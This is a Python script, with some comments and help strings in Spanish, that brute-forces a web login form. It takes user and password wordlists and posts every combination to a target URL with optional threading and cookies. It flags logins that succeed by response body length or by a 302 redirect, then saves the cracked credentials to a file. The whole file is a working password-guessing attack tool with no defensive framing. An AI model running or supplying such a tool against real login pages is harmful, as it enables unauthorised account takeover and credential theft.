from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse, requests, time, sys

def load_list(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def try_login(session, url, user, pwd, headers, min_body_length, accept_302):
    data = {"username": user, "password": pwd, "Login": "Login"}
    try:
        r = session.post(url, headers=headers, data=data, allow_redirects=False, timeout=10)
    except Exception as e:
        return ("error", user, pwd, str(e), None, r if 'r' in locals() else None)
    body_len = len(r.text or "")
    status = r.status_code
    # Detection: primarily based on body length >= threshold.
    # By default, we DO NOT consider 302 as success (accept_302=False).
    if (min_body_length is not None) and (body_len >= min_body_length):
        return ("success", user, pwd, f"len={body_len}", body_len, status)
    if accept_302 and status == 302:
        return ("success", user, pwd, "302", body_len, status)
    return ("fail", user, pwd, f"status={status} len={body_len}", body_len, status)

def thread_worker(pairs, url, headers, min_body_length, accept_302, delay):
    s = requests.Session()
    if headers.get("Cookie"):
        s.headers.update({"Cookie": headers["Cookie"]})
    s.headers.update({"User-Agent": headers.get("User-Agent","")})
    results = []
    for u,p in pairs:
        res = try_login(s, url, u, p, s.headers, min_body_length, accept_302)
        results.append(res)
        if delay:
            time.sleep(delay)
    return results

def chunkify(lst, n):
    """Split list into n roughly equal chunks (n may be greater than len(lst))."""
    if n <= 1:
        return [lst]
    k, m = divmod(len(lst), n)
    chunks = []
    i = 0
    for _ in range(n):
        sz = k + (1 if m > 0 else 0)
        m -= 1
        if sz:
            chunks.append(lst[i:i+sz])
            i += sz
    return [c for c in chunks if c]

def main():
    ap = argparse.ArgumentParser(description="Brute-force by body length (requests)")
    ap.add_argument("--target", required=True)
    ap.add_argument("--users", required=True)
    ap.add_argument("--passwords", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--min-body-length", type=int, default=4500, help="Umbral de bytes para considerar éxito")
    ap.add_argument("--accept-302", action="store_true", help="Considerar 302 como éxito (opcional)")
    ap.add_argument("--threads", type=int, default=1)
    ap.add_argument("--delay", type=float, default=0.0, help="Delay entre intentos por hilo (s)")
    ap.add_argument("--output", default="found_len.txt")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    users = load_list(args.users)
    passwords = load_list(args.passwords)
    if not users or not passwords:
        print("Listas vacías.", file=sys.stderr); sys.exit(1)

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    if args.cookie:
        headers["Cookie"] = args.cookie

    # Build pairs (memory: for very huge lists adapt streaming)
    pairs = [(u,p) for u in users for p in passwords]
    total = len(pairs)
    print(f"Total intentos: {total}; threads={args.threads}; min_body_len={args.min_body_length}; accept_302={args.accept_302}")

    found = []
    start = time.time()

    if args.threads <= 1:
        # sequential
        session = requests.Session()
        if args.cookie:
            session.headers.update({"Cookie": args.cookie})
        session.headers.update({"User-Agent": headers["User-Agent"]})
        for (u,p) in pairs:
            status, user, pwd, info, blen, st = try_login(session, args.target, u, p, session.headers, args.min_body_length, args.accept_302)
            if args.verbose:
                print(f"{status}: {user}:{pwd} ({info})")
            if status == "success":
                found.append((user,p,info,blen,st))
                with open(args.output, "a") as fo:
                    fo.write(f"{user}:{pwd}  # {info} len={blen} status={st}\n")
            if args.delay:
                time.sleep(args.delay)
    else:
        # concurrent: split pairs into chunks
        chunks = chunkify(pairs, args.threads * 4)
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = {ex.submit(thread_worker, chunk, args.target, headers, args.min_body_length, args.accept_302, args.delay): chunk for chunk in chunks}
            for fut in as_completed(futures):
                for status, user, pwd, info, blen, st in fut.result():
                    if args.verbose:
                        print(f"{status}: {user}:{pwd} ({info})")
                    if status == "success":
                        found.append((user,pwd,info,blen,st))
                        with open(args.output, "a") as fo:
                            fo.write(f"{user}:{pwd}  # {info} len={blen} status={st}\n")

    elapsed = time.time() - start
    print(f"Fin. Tiempo: {elapsed:.2f}s. Encontrados: {len(found)}")
    for u,p,i,bl,st in found:
        print(f"FOUND: {u}:{p}  ({i}) len={bl} status={st}")

if __name__ == "__main__":
    main()

